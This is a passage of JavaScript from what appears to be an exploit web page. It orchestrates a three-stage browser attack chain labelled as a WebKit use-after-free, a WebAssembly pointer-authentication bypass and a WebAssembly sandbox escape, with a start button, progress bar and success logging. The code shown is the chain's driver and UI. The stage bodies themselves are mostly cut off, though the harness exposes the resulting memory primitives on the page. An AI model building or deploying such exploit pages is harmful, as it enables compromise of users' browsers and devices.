            log(`[STAGE3] SharedArrayBuffer not available: ${e.message}`, 'warning');
        }
        
        log("[STAGE3] WebAssembly sandbox escape completed", 'success');
        return 0;
    }

    // ============================================================================
    // MAIN EXPLOIT
    // ============================================================================
    async function triggerExploit() {
        setStatus("Stage 1: WebKit UAF...", "running");
        setProgress(5);
        
        try {
            const primitive = await stage1();
            setProgress(40);
            
            if (!primitive) throw new Error("Stage1 failed");
            
            setStatus("Stage 2: WebAssembly PAC Bypass...", "running");
            const pacBypass = await stage2_wasm(primitive);
            setProgress(70);
            
            setStatus("Stage 3: WebAssembly Sandbox Escape...", "running");
            const result = await stage3_wasm(primitive, pacBypass);
            setProgress(100);
            
            log("[EXPLOIT] 🎉 Chain completed successfully!", 'success');
            log("[EXPLOIT] WebAssembly primitives available: window.wasmPrimitive", 'success');
            return result;
        } catch(e) {
            log(`[EXPLOIT] Error: ${e.message}`, 'error');
            throw e;
        }
    }

    // ============================================================================
    // START BUTTON
    // ============================================================================
    async function startExploit() {
        if (exploitStarted) return;
        exploitStarted = true;
        
        const btn = document.getElementById('goBtn');
        btn.disabled = true;
        btn.textContent = 'Running...';
        document.getElementById('progressBar').classList.add('active');
        setProgress(0);
        
        try {
            const result = await triggerExploit();
            if (result === 0) {
                setStatus("Success! Exploit completed", "success");
                btn.textContent = 'Done';
            } else {
                setStatus("Finished", "success");
                btn.textContent = 'Done';
            }
        } catch (e) {
            setStatus("Failed: " + (e.message || "unknown"), "error");
            btn.textContent = 'Retry';
            btn.disabled = false;
            exploitStarted = false;
        }
    }
    </script>
